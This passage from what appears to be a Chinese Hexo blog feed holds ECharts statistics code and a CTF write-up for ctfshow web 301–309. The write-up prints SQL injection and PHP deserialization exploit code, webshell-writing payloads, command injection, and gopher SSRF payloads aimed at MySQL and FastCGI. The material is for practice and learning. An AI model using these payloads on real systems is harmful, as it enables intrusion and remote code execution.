\"']\"\n    }\n    res += `\n    {\n      top : ${60 + (year - start) * 150},\n      range: ${range},\n      cellSize: [13, 13],\n      splitLine: {\n          show: true\n      },\n      yearLabel: {\n          position: 'left',\n          show: true,\n          color: color\n      },\n      monthLabel: {\n          nameMap: ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],\n          fontSize: 11,\n          color: color\n      },\n      dayLabel: {\n          formatter: '{start}  1st',\n          nameMap: ['','Mon','','Wed','','Fri',''],\n          fontSize: 11,\n          color: color\n      }\n    },`\n  }\n  res += '],'\n  return res\n}\n\nfunction getCalendarSeries(dateMap, start_year, end_date) {\n  var res = '['\n  for (var year = start_year; year &lt;= end_date.year(); year += 1) {\n    var tmp_start_date = moment().year(year).startOf('year')\n    var tmp_end_date = year == end_date.year() ? end_date : moment().year(year).endOf('year')\n    var datePosts = '['\n    var day_time = 3600 * 24 * 1000\n    var i = 0\n    for (var time = tmp_start_date; time &lt;= tmp_end_date; time += day_time) {\n      var date = moment(time).format('YYYY-MM-DD')\n      datePosts = (i === 0 ? datePosts + '[\"' : datePosts + ', [\"') + date + '\", ' + (dateMap.has(date) ? dateMap.get(date) : 0) + ']'\n      i++\n    }\n    datePosts += ']';\n    res += `{\n    type: 'heatmap',\n    coordinateSystem: 'calendar',\n    calendarIndex: ${year - start_year},\n    data: ${datePosts},\n    itemStyle: {\n      borderColor: '#fff',\n      borderWidth: 2,\n      borderRadius: 4\n    }\n  },`\n  }\n  res += ']'\n  return res\n\n}\n\nfunction postsCalendar() {\n\n  // post and count map.\n  var dateMap = new Map();\n  hexo.locals.get('posts').forEach(function (post) {\n    var date = post.date.format('YYYY-MM-DD')\n    var count = dateMap.get(date);\n    dateMap.set(date, count == null || count == undefined ? 1 : count + 1);\n  });\n  // calculate range.\n  const start_date = getMinDate(Array.from(dateMap.keys())).startOf('year')\n  const end_date = moment();\n  const start_year = start_date.year()\n  const end_year = end_date.year()\n  const calendar_data = getCalendar(start_year, end_year, end_date)\n  const series_data = getCalendarSeries(dateMap, start_year, end_date)\n  const darkmode = hexo.theme.config['darkmode']\n  \n  return `\n  &lt;script id=\"postsCalendar\"&gt;\n    var color\n    if (localStorage['theme'] === 'dark') {\n      color = '#ccc'\n    }\n    else if (localStorage['theme'] === 'light') {\n      color = '#333'\n    }\n    else {\n      color = ${darkmode} ? '#ccc' : '#333'\n    }\n    var postsCalendar = echarts.init(document.getElementById('posts-calendar'), 'light');\n    var postsCalendarOption = {\n      darkMode: color === '#ccc' ? true : false,\n      textStyle: {\n        color: color\n      },\n      title: {\n          top: 0,\n          text: '文章发布日历',\n          left: 'center',\n          textStyle: {\n              color: color\n          }\n      },\n      tooltip: {\n          formatter: function (obj) {\n              var value = obj.value;\n              return '&lt;div style=\"font-size: 14px;\"&gt;' + value[0] + ':' + value[1] + '&lt;/div&gt;';\n          }\n      },\n      visualMap: {\n          type: 'piecewise',\n          min: 0,\n          show: true,\n          showLabel: true,\n          pieces: [\n            {gte: 11, color: '#216E39'}, \n            {gte: 8, lte: 10, color: '#30A14E'},\n            {gte: 5, lte: 7, color: '#3FC262'},\n            {gte: 1, lte: 4, color: '#9BE9A8'},\n            {value: 0, color: '#EBEDF0'}\n          ],\n          calculable: true,\n          textStyle:{\n            color: color\n          },\n          inRange: {\n              symbol: 'rect',\n              color: ['#EBEDF0','#9BE9A8','#3FC262','#30A14E','#216E39'],\n          },\n          itemWidth: 12,\n          itemHeight: 12,\n          orient: 'horizontal',\n          left: 'center',\n          bottom: 80\n      },\n      calendar: ${calendar_data}\n      series: ${series_data}\n    };\n    postsCalendar.setOption(postsCalendarOption);\n    window.addEventListener(\"resize\", () =&gt; { \n      postsCalendar.resize();\n    });\n    &lt;/script&gt;`\n}\n\nfunction postsChart() {\n  const startDate = moment('2021-08')  // 开始统计的时间\n  const endDate = moment()\n\n  const monthMap = new Map()\n  const dayTime = 3600 * 24 * 1000\n  for (let time = startDate; time &lt;= endDate; time += dayTime) {\n    const month = moment(time).format('YYYY-MM')\n    if (!monthMap.has(month)) {\n      monthMap.set(month, 0)\n    }\n  }\n  hexo.locals.get('posts').forEach(function (post) {\n    const month = post.date.format('YYYY-MM')\n    if (monthMap.has(month)) {\n      monthMap.set(month, monthMap.get(month) + 1)\n    }\n  })\n  const monthArr = JSON.stringify([...monthMap.keys()])\n  const monthValueArr = JSON.stringify([...monthMap.values()])\n  const darkmode = hexo.theme.config['darkmode']\n\n  return `\n  &lt;script id=\"postsChart\"&gt;\n    var color\n    if (localStorage['theme'] === 'dark') {\n      color = '#ccc'\n    }\n    else if (localStorage['theme'] === 'light') {\n      color = '#333'\n    }\n    else {\n      color = ${darkmode} ? '#ccc' : '#333'\n    }\n    var postsChart = echarts.init(document.getElementById('posts-chart'), 'light');\n    var postsOption = {\n      darkMode: color === '#ccc' ? true : false,\n      textStyle: {\n        color: color\n      },\n      title: {\n        text: '文章发布统计图',\n        x: 'center',\n        textStyle: {\n          color: color\n        }\n      },\n      tooltip: {\n        trigger: 'axis'\n      },\n      xAxis: {\n        name: '日期',\n        type: 'category',\n        axisTick: {\n          show: false\n        },\n        axisLine: {\n          show: true,\n          lineStyle: {\n            color: color\n          }\n        },\n        data: ${monthArr}\n      },\n      yAxis: {\n        name: '文章篇数',\n        type: 'value',\n        splitLine: {\n          show: false\n        },\n        axisTick: {\n          show: false\n        },\n        axisLine: {\n          show: true,\n          lineStyle: {\n            color: color\n          }\n        }\n      },\n      series: [{\n        name: '文章篇数',\n        type: 'line',\n        smooth: true,\n        lineStyle: {\n            width: 0\n        },\n        showSymbol: false,\n        itemStyle: {\n          opacity: 1,\n          color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{\n            offset: 0,\n            color: 'rgba(128, 255, 165)'\n          },\n          {\n            offset: 1,\n            color: 'rgba(1, 191, 236)'\n          }])\n        },\n        areaStyle: {\n          opacity: 1,\n          color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{\n            offset: 0,\n            color: 'rgba(128, 255, 165)'\n          }, {\n            offset: 1,\n            color: 'rgba(1, 191, 236)'\n          }])\n        },\n        data: ${monthValueArr},\n        markLine: {\n          data: [{\n            name: '平均值',\n            type: 'average'\n          }]\n        }\n      }]\n    };\n    postsChart.setOption(postsOption);\n    window.addEventListener(\"resize\", () =&gt; { \n      postsChart.resize();\n    });\n    &lt;/script&gt;`\n}\n\nfunction tagsChart(len) {\n  const tagArr = []\n  hexo.locals.get('tags').map(function (tag) {\n    tagArr.push({ name: tag.name, value: tag.length })\n  })\n  tagArr.sort((a, b) =&gt; { return b.value - a.value })\n\n  let dataLength = Math.min(tagArr.length, len) || tagArr.length\n  const tagNameArr = []\n  const tagCountArr = []\n  for (let i = 0; i &lt; dataLength; i++) {\n    tagNameArr.push(tagArr[i].name)\n    tagCountArr.push(tagArr[i].value)\n  }\n  const tagNameArrJson = JSON.stringify(tagNameArr)\n  const tagCountArrJson = JSON.stringify(tagCountArr)\n  const darkmode = hexo.theme.config['darkmode']\n\n  return `\n  &lt;script id=\"tagsChart\"&gt;\n    var color\n    if (localStorage['theme'] === 'dark') {\n      color = '#ccc'\n    }\n    else if (localStorage['theme'] === 'light') {\n      color = '#333'\n    }\n    else {\n      color = ${darkmode} ? '#ccc' : '#333'\n    }\n    var tagsChart = echarts.init(document.getElementById('tags-chart'), 'light');\n    var tagsOption = {\n      darkMode: color === '#ccc' ? true : false,\n      textStyle: {\n        color: color\n      },\n      title: {\n        text: 'Top ${dataLength} 标签统计图',\n        x: 'center',\n        textStyle: {\n          color: color\n        }\n      },\n      tooltip: {},\n      xAxis: {\n        name: '标签',\n        type: 'category',\n        axisTick: {\n          show: false\n        },\n        axisLine: {\n          show: true,\n          lineStyle: {\n            color: color\n          }\n        },\n        data: ${tagNameArrJson}\n      },\n      yAxis: {\n        name: '文章篇数',\n        type: 'value',\n        splitLine: {\n          show: false\n        },\n        axisTick: {\n          show: false\n        },\n        axisLine: {\n          show: true,\n          lineStyle: {\n            color: color\n          }\n        }\n      },\n      series: [{\n        name: '文章篇数',\n        type: 'bar',\n        data: ${tagCountArrJson},\n        itemStyle: {\n          opacity: 1,\n          color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{\n            offset: 0,\n            color: 'rgba(128, 255, 165)'\n          },\n          {\n            offset: 1,\n            color: 'rgba(1, 191, 236)'\n          }])\n        },\n        emphasis: {\n          itemStyle: {\n            opacity: 1,\n            color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [{\n              offset: 0,\n              color: 'rgba(128, 255, 195)'\n            },\n            {\n              offset: 1,\n              color: 'rgba(1, 211, 255)'\n            }])\n          }\n        },\n        markLine: {\n          data: [{\n            name: '平均值',\n            type: 'average'\n          }]\n        }\n      }]\n    };\n    tagsChart.setOption(tagsOption);\n    window.addEventListener(\"resize\", () =&gt; { \n      tagsChart.resize();\n    });\n    &lt;/script&gt;`\n}\n\nfunction categoriesChart() {\n  const categoryArr = []\n  hexo.locals.get('categories').map(function (category) {\n    categoryArr.push({ name: category.name, value: category.length })\n  })\n  categoryArr.sort((a, b) =&gt; { return b.value - a.value });\n  const categoryArrJson = JSON.stringify(categoryArr)\n  const darkmode = hexo.theme.config['darkmode']\n\n  return `\n  &lt;script id=\"categoriesChart\"&gt;\n    var color\n    if (localStorage['theme'] === 'dark') {\n      color = '#ccc'\n    }\n    else if (localStorage['theme'] === 'light') {\n      color = '#333'\n    }\n    else {\n      color = ${darkmode} ? '#ccc' : '#333'\n    } \n    var categoriesChart = echarts.init(document.getElementById('categories-chart'), 'light');\n    var categoriesOption = {\n      darkMode: color === '#ccc' ? true : false,\n      textStyle: {\n        color: color\n      },\n      title: {\n        text: '文章分类统计图',\n        x: 'center',\n        textStyle: {\n          color: color\n        }\n      },\n      legend: {\n        top: 'bottom',\n        textStyle: {\n          color: color\n        }\n      },\n      tooltip: {\n        trigger: 'item',\n        formatter: \"{a} &lt;br/&gt;{b} : {c} ({d}%)\",\n      },\n      series: [{\n        name: '文章篇数',\n        type: 'pie',\n        radius: [30, 80],\n        center: ['50%', '50%'],\n        roseType: 'area',\n        label: {\n          formatter: \"{b} : {c} ({d}%)\"\n        },\n        data: ${categoryArrJson},\n        itemStyle: {\n          emphasis: {\n            shadowBlur: 10,\n            shadowOffsetX: 0,\n            shadowColor: 'rgba(255, 255, 255, 0.5)'\n          }\n        }\n      }]\n    };\n    categoriesChart.setOption(categoriesOption);\n    window.addEventListener(\"resize\", () =&gt; { \n      categoriesChart.resize();\n    });\n    &lt;/script&gt;`\n}\n</code></pre>\n<p>更多统计图的自定义属性可以查看 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lY2hhcnRzLmFwYWNoZS5vcmcvemgvb3B0aW9uLmh0bWw=\">ECharts 配置项文档</span>，根据自行喜好对 ECharts 统计图进行修改。</p>\n<p>在这里，文章发布日历我是仿github的绿色样式</p>\n<p><img data-src=\"/../../../post_images/hexo/shoka/add_statistic_1.jpg\"></p>\n",
            "tags": [
                "hexo"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/9e150aa2/",
            "url": "http://dpm12345.cn/posts/9e150aa2/",
            "title": "代码审计",
            "date_published": "2023-01-15T14:53:15.000Z",
            "content_html": "<h1 id=\"web-301\"><a href=\"#web-301\" class=\"headerlink\" title=\"web 301\"></a>web 301</h1><p>下载源码文件，发现在<code>checklogin.php</code>文件中的sql查询语句没有过滤</p>\n<pre><code class=\"php\">$sql=\"select sds_password from sds_user where sds_username='\".$username.\"' order by id limit 1;\";\n</code></pre>\n<p>而<code>$username</code>是可控的，故可以用sqlmap爆破出密码，或者写一句话木马文件</p>\n<h2 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h2><p>运行脚本</p>\n<pre><code class=\"bash\">python sqlmap.py -u http://392cb8ff-78e8-4004-9117-6a9a0d378c35.challenge.ctf.show/checklogin.php --form --batch --dump\n</code></pre>\n<p>所花时间比较长，需要等待</p>\n<p>最后得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap.jpg\" alt=\"sqlmap结构结果\" title=\"运行结果\"></p>\n<p>username：<code>admin</code></p>\n<p>password： <code>ctfshowwwww</code></p>\n<p>登录成功后跳转到<code>index.php</code></p>\n<p>可以看到flag</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap_result.jpg\"></p>\n<h2 id=\"写一句话\"><a href=\"#写一句话\" class=\"headerlink\" title=\"写一句话\"></a>写一句话</h2><p>根据原SQL语句的结构，注入位置为<code>where</code>后，首先需要闭合单引号<code>'</code>，再由此进行联合查询写文件,最后再过滤即可</p>\n<pre><code class=\"sql\">' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#\n</code></pre>\n<p>于是在登陆界面</p>\n<p>username: <code>' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#</code></p>\n<p>password: <code>1</code></p>\n<p>点击登录后，可以发现停在<code>checklogin.php</code>，可知sql语句执行成功</p>\n<p>访问<code>1.php</code>，报错<code>Notice: Undefined offset: 1 in /var/www/html/1.php on line 1</code></p>\n<p><code>1=system('ls')</code>可以看到flag.php</p>\n<p><code>1=system('tac flag.php');</code>得到flag</p>\n<p><code>ctfshow{be6425ec-a5f6-4afb-b76f-104b34576198}</code></p>\n<h1 id=\"web-302\"><a href=\"#web-302\" class=\"headerlink\" title=\"web 302\"></a>web 302</h1><p>题目提示</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n</code></pre>\n<p>但sql语句在之前已经执行，因此同样可以采用上面的两种方法</p>\n<h1 id=\"web-303\"><a href=\"#web-303\" class=\"headerlink\" title=\"web 303\"></a>web 303</h1><p>根据题目所给的源码，在<code>dptadd.php</code>中找到注入点</p>\n<pre><code class=\"php\">$sql=\"insert into sds_dpt set sds_name='\".$dpt_name.\"',sds_address ='\".$dpt_address.\"',sds_build_date='\".$dpt_build_year.\"',sds_have_safe_card='\".$dpt_has_cert.\"',sds_safe_card_num='\".$dpt_cert_number.\"',sds_telephone='\".$dpt_telephone_number.\"';\";\n</code></pre>\n<p>而在这一sql语句中，没有任何的过滤</p>\n<p>而要进入这一段代码的执行，可以看到，<code>if(!isset($_SESSION['login']))</code>，即需要先登录成功</p>\n<p>再次查看源码，在<code>sds_user.sql</code>文件中，有这样一条信息</p>\n<pre><code class=\"sql\">INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');\n</code></pre>\n<p>也就是说，我们知道了一个账户的账号和密码，因此可以借此登录。但很明显，密码为密文形式，需要解出明文</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n    $_SESSION['login']=1;\n    $result-&gt;free();\n    $mysqli-&gt;close();\n    header(\"location:index.php\");\n    return;\n}\n</code></pre>\n<p>也就是说，只有<code>sds_decode($userpwd)</code>与<code>$row['sds_password']</code>相等才可以登陆成功，已知<code>$row['sds_password']</code>为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>查看<code>sds_decode</code>方法的定义，在<code>fun.php</code>中</p>\n<pre><code class=\"php\">&lt;?php\nfunction sds_decode($str){\n    return md5(md5($str.md5(base64_encode(\"sds\"))).\"sds\");\n}\necho sds_decode(\"admin\");\n?&gt;\n</code></pre>\n<p>尝试用该方法的逆向过程解密，但发现<code>27151b7b1ad51a38ea66b1529cde5ee4</code>解不了</p>\n<p>看到<code>echo sds_decode(\"admin\");</code>，尝试运行，会发现输出的内容恰好为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>于是得知一个账户的账号和密码，均为<code>admin</code></p>\n<p>当执行成功后，会跳转到<code>dpt.php</code></p>\n<p>而<code>dpt.php</code>中有</p>\n<pre><code class=\"php\">&lt;?php\n//注入点\n$_GET['id']=!empty($_GET['id'])?$_GET['id']:NULL;\n$page=$_GET['id'];\n                        \n                                \n$sql=\"select * from sds_dpt order by id;\";\n$result=$mysqli-&gt;query($sql);\n?&gt;\n</code></pre>\n<p>也即可以利用这一页面来查看添加的值，于是查表payload</p>\n<p><code>dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_1.jpg\"></p>\n<p><code>sds_dpt,sds_fl9g,sds_user</code></p>\n<p>猜测在表<code>sds_fl9g</code></p>\n<p>查列payload:<code>dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sds_fl9g')%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_2.jpg\"></p>\n<p><code>flag</code></p>\n<p>查值payload：<code>dpt_name=1',sds_address=(select group_concat(flag) from sds.sds_fl9g)%23</code>(数据库名<code>sds</code>可以从源码中的<code>conn.php</code>找到，也可以查)</p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_3.jpg\"></p>\n<h1 id=\"web-304\"><a href=\"#web-304\" class=\"headerlink\" title=\"web 304\"></a>web 304</h1><p>说添加了waf，但实际没有，同上面方法，除表名改为<code>sds_flaag</code>，其他不变</p>\n<h1 id=\"web-305\"><a href=\"#web-305\" class=\"headerlink\" title=\"web 305\"></a>web 305</h1><p>此题增加了waf，不能像上两题一样解题，但很明显多了个<code>class.php</code>文件，查看</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-17 13:20:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-17 13:33:21\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n</code></pre>\n<p>看到</p>\n<pre><code class=\"php\">public function __destruct(){\n    file_put_contents($this-&gt;username, $this-&gt;password);\n}\n</code></pre>\n<p>看起来是反序列化</p>\n<p>再看<code>checklogin.php</code>，看到</p>\n<pre><code class=\"php\">$user_cookie = $_COOKIE['user'];\nif(isset($user_cookie)){\n    $user = unserialize($user_cookie);\n}\n</code></pre>\n<p>没有任何限制，也就是只要创建一个反序列化对象即可，然后通过<code>$COOKIE['user']</code>传递，最后点击登录，便能执行反序列化</p>\n<pre><code class=\"php\">&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n\n$a = new user('1.php','&lt;?php eval($_POST[1]);?&gt;');\necho urlencode(serialize($a));\n</code></pre>\n<p>按以上操作后，访问<code>1.php</code></p>\n<p>可以看到报错，使用蚁剑连接数据库</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_305.jpg\"></p>\n<p>数据库类型为<code>MYSQLI</code>，密码为<code>root</code>(该密码可在蚁剑文件界面的<code>conn.php</code>找到，与下载来的源码文件不同)</p>\n<p>通过查表，得到flag在<code>sds.sds_flabag</code></p>\n<h1 id=\"web-306\"><a href=\"#web-306\" class=\"headerlink\" title=\"web 306\"></a>web 306</h1><p>查看代码，发现<code>index.php</code>有反序列化操作</p>\n<pre><code class=\"php\">$user = unserialize(base64_decode($_COOKIE['user']));\nif(!$user){\n    header(\"location:login.php\");\n}\n</code></pre>\n<p>于是查找其他文件，寻找<code>__wakeup()``__destruct</code>方法或者可以写文件之类的函数，如<code>file_put_contents</code></p>\n<p>最后可在<code>class.php</code>中找到</p>\n<pre><code class=\"php\">class log{\n    public $title='log.txt';\n    public $info='';\n    public function loginfo($info){\n        $this-&gt;info=$this-&gt;info.$info;\n    }\n    public function close(){\n        file_put_contents($this-&gt;title, $this-&gt;info);\n    }\n}\n</code></pre>\n<p>只要构造一个log类对象，然后调用<code>close()</code>方法，便能写文件</p>\n<p>查找所有文件的类中是否有调用<code>close()</code>的方法</p>\n<p>在<code>dao.php</code>中找到</p>\n<pre><code class=\"php\">class dao{\n    private $config;\n    private $conn;\n\n    public function __construct(){\n        $this-&gt;config=new config();\n        $this-&gt;init();\n    }\n    private function init(){\n        $this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());\n    }\n    public function __destruct(){\n        $this-&gt;conn-&gt;close();\n    }\n\n    public function get_user_password_by_username($u){\n        $sql=\"select sds_password from sds_user where sds_username='\".$u.\"' order by id limit 1;\";\n        $result=$this-&gt;conn-&gt;query($sql);\n        $row=$result-&gt;fetch_array(MYSQLI_BOTH);\n        if($result-&gt;num_rows&gt;0){\n            return $row['sds_password'];\n        }else{\n            return '';\n        }\n    }\n\n}\n</code></pre>\n<p>当其<code>__destruct</code>时即可执行，但由于以其本身创建的<code>$this-&gt;conn</code>为<code>mysqli</code>对象，故需要想方法使其为<code>log</code>对象</p>\n<p>好在该文件<code>require \"class.php\"</code>，故可以构造时就使其为<code>log</code>对象</p>\n<p>而在<code>index.php</code>，又也<code>require \"dao.php\"</code></p>\n<p>故代码为</p>\n<pre><code class=\"php\">&lt;?php\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;conn=$u;\n    }\n}\n\nclass log{\n    public $title='1.php';\n    public $info='&lt;?php eval($_POST[1]);?&gt;';\n}\n\n$a = new dao(new log());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>payload为<code>TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtOO3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</code></p>\n<p>填写cookie后，访问<code>index.php</code>，再访问<code>1.php</code>，得到报错<strong>Notice</strong>: Undefined offset: 1 in <strong>/var/www/html/1.php</strong> on line <strong>1</strong></p>\n<p><code>1=system('ls');</code>后发现有<code>flag.php</code>，<code>1=system('tac flag.php');</code>，得到flag</p>\n<h1 id=\"web-307\"><a href=\"#web-307\" class=\"headerlink\" title=\"web 307\"></a>web 307</h1><p>查询反序列化路口，可以找到四个，其中三个只有反序列化，一个为反序列化后，并调用了其<code>clearCache()</code>方法</p>\n<p>查看所有的类，之前能用的<code>__destruct</code>中<code>close()</code>，由于<code>log</code>类的对应写文件方法为<code>closelog()</code>，故该方法失效，所以只能选用<code>logout.php</code>中的反序列化，调用<code>clearCache()</code>方法</p>\n<p>查看所有拥有<code>clearCache()</code>方法的类，为<code>dao</code>和<code>service</code>，而<code>service</code>最终调用的也为<code>dao</code>类中的<code>clearCache()</code>方法</p>\n<pre><code class=\"php\">public function  clearCache(){\n    shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n}\n</code></pre>\n<p>故只需巧妙构造一个<code>$this-&gt;config-&gt;cache_dir</code>便可执行系统命令</p>\n<p>而对于<code>config</code>类</p>\n<pre><code class=\"php\">class config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'cache';\n\n    public function get_mysql_username(){\n        return $this-&gt;mysql_username;\n    }\n    public function get_mysql_password(){\n        return $this-&gt;mysql_password;\n    }\n    public function get_mysql_port(){\n        return $this-&gt;mysql_port;\n    }\n    public function get_mysql_db(){\n        return $this-&gt;mysql_db;\n    }\n    public function get_mysql_host(){\n        return $this-&gt;mysql_host;\n    }\n}\n</code></pre>\n<p>只需修改<code>public $cache_dir = 'cache';</code>项</p>\n<p>故现在有两个选项，序列化<code>dao</code>和序列化<code>service</code></p>\n<p>但由于<code>service</code>类存在<code>__wakeup()</code>方法，再进行反序列化操作前，会调用此方法</p>\n<pre><code class=\"php\">public function __wakeup(){\n    $this-&gt;config=new config();\n    $this-&gt;dao=new dao();\n}\n</code></pre>\n<p>也即此时的<code>config</code>和<code>dao</code>都会刷新，那么<code>dao</code>中的构造好的<code>config</code>也会刷新，从而丢失构造好的数据，故只能选用<code>dao</code>序列化</p>\n<p>代码如下</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'x;echo \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\";echo ';\n}\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;config=$u;\n    }\n}\n\n$a = new dao(new config());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>访问<code>controller/logout.php</code>，自动跳转到<code>login.php</code>后，访问<code>1.php</code>，之后分别输入<code>1=system('ls')</code>和<code>1=system('tac flag.php')</code>得到flag</p>\n<h1 id=\"web-308\"><a href=\"#web-308\" class=\"headerlink\" title=\"web 308\"></a>web 308</h1><p>相较于上题，<code>clearCache()</code>方法添加了正则匹配</p>\n<pre><code class=\"php\">public function  clearCache(){\n    if(preg_match('/^[a-z]+$/i', $this-&gt;config-&gt;cache_dir)){\n        shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n    }\n}\n</code></pre>\n<p>输入的目录只允许存在字母，这里便不利于使用，放弃该利用点</p>\n<p>在<code>fun.php</code>中存在ssrf</p>\n<pre><code class=\"php\">function checkUpdate($url){\n        $ch=curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_HEADER, false);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); \n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        $res = curl_exec($ch);\n        curl_close($ch);\n        return $res;\n    }\n</code></pre>\n<p>而这函数在<code>dao</code>类的<code>checkVersion</code>方法中出现</p>\n<pre><code class=\"php\">public function checkVersion(){\n    return checkUpdate($this-&gt;config-&gt;update_url);\n}\n</code></pre>\n<p>而<code>checkVersion</code>在<code>index.php</code>中被调用</p>\n<pre><code class=\"php\">$service = unserialize(base64_decode($_COOKIE['service']));\nif($service){\n    $lastVersion=$service-&gt;checkVersion();\n}\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>其中<code>$update_url</code>由gopherus生成</p>\n<p>由于从代码可知为mysql，故生成命令</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit mysql\nroot\nselect \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web308.jpg\"></p>\n<p>最后访问<code>1.php</code>，拿到shell，获取flag</p>\n<h1 id=\"web-309\"><a href=\"#web-309\" class=\"headerlink\" title=\"web 309\"></a>web 309</h1><p>打的不是mysql了，打的是fastcgi.探测是通过gopher协议的延迟判断的</p>\n<p>gopher://127.0.0.1:9000</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit fastcgi\nindex.php\necho \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web309.jpg\"></p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 